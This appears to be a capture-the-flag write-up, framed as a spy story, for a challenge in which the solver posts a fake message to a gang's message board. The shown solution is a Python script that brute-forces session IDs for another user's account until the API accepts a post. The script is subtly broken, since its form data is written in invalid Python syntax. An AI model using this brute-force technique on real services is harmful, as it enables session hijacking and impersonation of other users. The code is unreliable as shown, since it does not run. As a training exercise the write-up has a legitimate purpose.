# Benjamin the Brute
Agent 707, one of the gang, Benjamin Goldleaf, was yesterday overheard by our inside undercover agent talking about posting notices on a secret message board that the gang use to communicate meeting times.

With a bit of detective work we've managed to find the message board and get Bens user details. We want to post a fake message using the API to try and draw one of the more senior gang members out, but we can't get it to work. See if you can.

## Steps
1. Write Python code

```python
import requests, re

URL = "https://bondogge.com/createPost"

sess_id = 0
while True:
    request_html = requests.post(URL, data=("userID": 24, "sessID": str(sess_id))).text

    if not re.search("Error", request_html):
        print(request_html)
        break

    sess_id += 1
```

![python code](/assets/screenshots/hq-11-BenjamintheBrute.png)